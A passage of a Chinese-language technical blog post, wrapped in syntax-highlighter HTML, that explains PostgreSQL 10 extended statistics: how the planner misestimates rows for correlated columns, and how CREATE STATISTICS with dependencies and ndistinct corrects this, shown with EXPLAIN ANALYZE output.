line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae3458b793195282-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">FROM</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-st\">and</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span>                            </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae3458b793195282-2\">                                                <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                </div><div class=\"crayon-line\" id=\"crayon-5b625fae3458b793195282-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae3458b793195282-4\"> <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..194248.69</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">100</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.640..630.130</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae3458b793195282-5\">   <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-st\">AND</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae3458b793195282-6\">   <span class=\"crayon-i\">Rows</span> <span class=\"crayon-i\">Removed</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">9990000</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae3458b793195282-7\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.072</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae3458b793195282-8\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">630.467</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae3458b793195282-9\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p>planner 的估计减少了100倍！ 让我们试着理解为什么发生这种情况。<br>\n第一个列的选择性约为 0.001（1/1000），第二个列的选择性为 0.01（1/100）。 要计算将由这两个“独立”条件过滤的行数，planner 会将它们的选择性相乘。 所以，我们得到：</p>\n<p>选择性= 0.001 * 0.01 = 0.00001。</p>\n<p>当它乘以我们在表中的行数即 10000000 时，我们得到 100。这就是 planner 对 100 的估计值的来源。 但是，这些列不是独立的，那么我们如何告知 planner ？</p>\n<p><strong>在 PostgreSQL 中创建统计信息</strong></p>\n<p>在 Postgres 10 之前，没有一种简易的方式去告诉 planner 采集捕捉列之间关系的数据统计。但是， Postgres 10 有一个新特性正好解决了这个问题，可以使用 <a href=\"https://www.postgresql.org/docs/10/static/sql-createstatistics.html\" target=\"_blank\" rel=\"nofollow\">CREATE STATISTICS</a> 来创建扩展统计的对象，告诉服务器去采集这些有意思的相关列的额外的统计信息。</p>\n<p><strong>函数依赖统计</strong></p>\n<p>回到我们先前评估的问题，col2 的值仅仅是 col1/10 。在数据库的术语中，我们会说 col2 是函数依赖于 col1 ，也就是说，col1 的值足以决定 col2 的值，并且不存在有两行数据拥有相同的 col1 值的同时有不同的 col2 值。因此，在 col2 列上的第二个过滤筛选并没有移除任何行！但是，planner 捕捉到了足够的统计信息去知道这件事情。</p>\n<p>让我们来创建一个统计对象去捕获这些列和运行分析（ANALYZE）所依赖的函数统计。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae34593824801139\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE STATISTICS s1 (dependencies) on col1, col2 from tbl; \r\nANALYZE tbl;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae34593824801139-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34593824801139-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae34593824801139-1\"><span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">STATISTICS</span> <span class=\"crayon-i\">s1</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dependencies</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34593824801139-2\"><span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p> </p>\n<p>让我们来看看现在的计划是怎么来的。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae34599197062891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1 and col2 = 0;                            \r\n                                                QUERY PLAN                                                 \r\n-----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..194247.76 rows=9584 width=8) (actual time=0.638..629.741 rows=10000 loops=1)\r\n   Filter: ((col1 = 1) AND (col2 = 0))\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.115 ms\r\n Execution time: 630.076 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae34599197062891-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34599197062891-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34599197062891-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34599197062891-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34599197062891-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34599197062891-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34599197062891-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34599197062891-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34599197062891-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae34599197062891-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">FROM</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-st\">and</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span>                            </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34599197062891-2\">                                                <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                 </div><div class=\"crayon-line\" id=\"crayon-5b625fae34599197062891-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34599197062891-4\"> <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..194247.76</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9584</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.638..629.741</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34599197062891-5\">   <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-st\">AND</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34599197062891-6\">   <span class=\"crayon-i\">Rows</span> <span class=\"crayon-i\">Removed</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">9990000</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34599197062891-7\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.115</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34599197062891-8\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">630.076</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34599197062891-9\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p> </p>\n<p>很好！让我们看一下对计划的测量。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae3459f317419141\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT stxname, stxkeys, stxdependencies                                                  \r\n  FROM pg_statistic_ext                                                                   \r\n  WHERE stxname = 's1';   \r\nstxname | stxkeys |   stxdependencies    \r\n---------+---------+----------------------\r\n s1      | 1 2     | {\"1 =&gt; 2\": 1.000000}\r\n(1 row)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae3459f317419141-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae3459f317419141-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae3459f317419141-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae3459f317419141-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae3459f317419141-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae3459f317419141-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae3459f317419141-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae3459f317419141-1\"><span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">stxname</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">stxkeys</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">stxdependencies</span>                                                  </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae3459f317419141-2\">  <span class=\"crayon-i\">FROM</span> <span class=\"crayon-v\">pg_statistic</span><span class=\"crayon-sy\">_</span>ext                                                                   </div><div class=\"crayon-line\" id=\"crayon-5b625fae3459f317419141-3\">  <span class=\"crayon-i\">WHERE</span> <span class=\"crayon-i\">stxname</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'s1'</span><span class=\"crayon-sy\">;</span>   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae3459f317419141-4\"><span class=\"crayon-i\">stxname</span> <span class=\"crayon-o\">|</span> <span class=\"crayon-i\">stxkeys</span> <span class=\"crayon-o\">|</span>   <span class=\"crayon-i\">stxdependencies</span>    </div><div class=\"crayon-line\" id=\"crayon-5b625fae3459f317419141-5\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae3459f317419141-6\"> <span class=\"crayon-i\">s1</span>      <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-cn\">2</span>     <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-s\">\"1 =&gt; 2\"</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">1.000000</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae3459f317419141-7\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span> <span class=\"crayon-v\">row</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p> </p>\n<p>看这里，我们可以看到， Postgres 意识到 col1 完全决定 col2 ，因此用系数1来捕获这些信息。现在，所有的查询都过滤这些列之后，计划将会得到更好的评估。</p>\n<p><strong>ndistinct 统计</strong></p>\n<p>函数依赖是你可以在列之间捕获的一种关系。 你可以捕获的另一种统计信息是一组列的不同值。 我们之前指出，planner 可以获取每列不同值的统计数字，但再次合并多列时，这些统计数据往往是错误的。</p>\n<p>这些不好的数据是在什么时候影响我们的呢？ 下面来看一个例子。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae345a6409144602\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT col1,col2,count(*) from tbl group by col1, col2;                   \r\n                                                         QUERY PLAN                                                          \r\n-----------------------------------------------------------------------------------------------------------------------------\r\n GroupAggregate  (cost=1990523.20..2091523.04 rows=100000 width=16) (actual time=2697.246..4470.789 rows=1001 loops=1)\r\n   Group Key: col1, col2\r\n   -&gt;  Sort  (cost=1990523.20..2015523.16 rows=9999984 width=8) (actual time=2695.498..3440.880 rows=10000000 loops=1)\r\n         Sort Key: col1, col2\r\n         Sort Method: external sort  Disk: 176128kB\r\n         -&gt;  Seq Scan on tbl  (cost=0.00..144247.84 rows=9999984 width=8) (actual time=0.008..665.689 rows=10000000 loops=1)\r\n Planning time: 0.072 ms\r\n Execution time: 4494.583 ms</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae345a6409144602-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345a6409144602-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345a6409144602-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345a6409144602-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345a6409144602-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345a6409144602-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345a6409144602-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345a6409144602-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345a6409144602-9\">9</div><div class=\"crayon-num crayon-striped-num\" 